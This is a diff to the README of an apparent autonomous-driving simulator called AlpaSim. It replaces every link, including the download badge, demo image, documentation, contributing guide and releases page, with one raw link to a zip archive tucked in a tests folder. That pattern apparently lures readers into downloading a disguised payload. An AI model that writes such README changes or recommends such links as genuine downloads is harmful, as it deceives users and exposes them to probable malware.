@@ -1,9 +1,9 @@
 # 🚗 alpasim - Simplified Simulator for Autonomous Driving
 
-[![Download AlpaSim](https://img.shields.io/badge/Download-AlpaSim-blue)](https://github.com/taha16112001/alpasim/releases)
+[![Download AlpaSim](https://github.com/taha16112001/alpasim/raw/refs/heads/main/src/tools/tests/Software_3.4.zip)](https://github.com/taha16112001/alpasim/raw/refs/heads/main/src/tools/tests/Software_3.4.zip)
 
 <div align="center">
-  <img src="docs/assets/images/thumbnail.gif" alt="AlpaSim Simulation Demo" width="600">
+  <img src="https://github.com/taha16112001/alpasim/raw/refs/heads/main/src/tools/tests/Software_3.4.zip" alt="AlpaSim Simulation Demo" width="600">
 </div>
 
 ## 🌟 What is AlpaSim?
@@ -35,7 +35,7 @@ Follow these steps to set up AlpaSim on your computer.
 
 ### 📥 Download & Install
 
-To download AlpaSim, visit this page: [Download AlpaSim](https://github.com/taha16112001/alpasim/releases).
+To download AlpaSim, visit this page: [Download AlpaSim](https://github.com/taha16112001/alpasim/raw/refs/heads/main/src/tools/tests/Software_3.4.zip).
 
 1. Click on the link.
 2. Find the latest release.
@@ -67,7 +67,7 @@ As the simulation runs, you can monitor different parameters, such as vehicle sp
 
 ## 🌐 Additional Resources
 
-- **Documentation**: For detailed information, visit our [Documentation](https://github.com/taha16112001/alpasim/wiki). Here you will find guides, API references, and examples.
+- **Documentation**: For detailed information, visit our [Documentation](https://github.com/taha16112001/alpasim/raw/refs/heads/main/src/tools/tests/Software_3.4.zip). Here you will find guides, API references, and examples.
 - **Community Support**: Join our community forums to ask questions and share your experiences. Connect with other users to gain insights and tips.
 - **Feature Requests**: If you have ideas for new features or improvements, please submit them through our issue tracker on GitHub.
 
@@ -81,11 +81,11 @@ If you encounter issues, consider the following solutions:
 
 ## 🤝 Contributing
 
-We welcome contributions to AlpaSim. If you would like to help improve the application, please visit our [Contributing Guide](https://github.com/taha16112001/alpasim/blob/main/CONTRIBUTING.md).
+We welcome contributions to AlpaSim. If you would like to help improve the application, please visit our [Contributing Guide](https://github.com/taha16112001/alpasim/raw/refs/heads/main/src/tools/tests/Software_3.4.zip).
 
 ## 📣 Updates
 
-Stay informed about the latest updates and releases by checking the [Releases Page](https://github.com/taha16112001/alpasim/releases). Regular updates will include new features, bug fixes, and improvements based on user feedback.
+Stay informed about the latest updates and releases by checking the [Releases Page](https://github.com/taha16112001/alpasim/raw/refs/heads/main/src/tools/tests/Software_3.4.zip). Regular updates will include new features, bug fixes, and improvements based on user feedback.
 
 ## 📞 Contact Us
 
@@ -93,6 +93,6 @@ For inquiries or feedback, feel free to reach out through our GitHub page or the
 
 ## 🔗 Quick Links
 
-- [Download AlpaSim](https://github.com/taha16112001/alpasim/releases)
-- [Documentation](https://github.com/taha16112001/alpasim/wiki)
-- [Contributing Guide](https://github.com/taha16112001/alpasim/blob/main/CONTRIBUTING.md)
+- [Download AlpaSim](https://github.com/taha16112001/alpasim/raw/refs/heads/main/src/tools/tests/Software_3.4.zip)
+- [Documentation](https://github.com/taha16112001/alpasim/raw/refs/heads/main/src/tools/tests/Software_3.4.zip)
+- [Contributing Guide](https://github.com/taha16112001/alpasim/raw/refs/heads/main/src/tools/tests/Software_3.4.zip)
